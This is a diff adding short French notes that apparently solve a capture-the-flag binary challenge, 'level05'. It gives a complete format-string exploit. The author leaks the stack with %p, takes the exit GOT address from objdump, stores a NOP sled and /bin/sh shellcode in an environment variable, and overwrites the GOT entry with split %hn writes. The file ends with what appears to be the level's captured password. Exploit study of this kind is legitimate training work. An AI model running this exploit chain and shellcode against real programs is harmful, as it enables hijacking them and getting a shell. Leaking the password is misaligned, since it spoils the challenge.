@@ -1,0 +1,30 @@
+alors on a une attaque a printf avec un exit c'est du deja vu sauf qu'on va sauter sur le chellcode
+
+python -c "print 'AAAA' + '%p ' * 10" | ./level05
+bon deja sa met en petit ma string, mais on peu voir le aaaa en 10eme position : 0x61616161
+
+
+objdump -R ./level05
+080497e0 R_386_JUMP_SLOT   exit
+
+export I=`python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+l'adresse et toujour la meme : FFFFD8F1
+
+python -c "print '\x08\x04\x97\xe0'[::-1] + '%4294957293p' + '%10$n'" | ./level05
+sa marche pas l'int et trop gros on va devoir decouper sa :/
+
+
+python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55525p' + '%10\$hn'     + '%10002p' +'%11\$hn'" > /tmp/lv5
+cat /tmp/lv5 - | ./level05
+
+hop quellque calcule : on va utiliser les %10$hn pour ecrire sur 2 octes par 2 octer on veu aller a l'adresse : 0xFFFF 0xD8f1
+on calcule combien on ecrit dans le 2eme : 0xFFFF-0xD8F1 =  10002
+
+
+
+
+
+
+
+
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
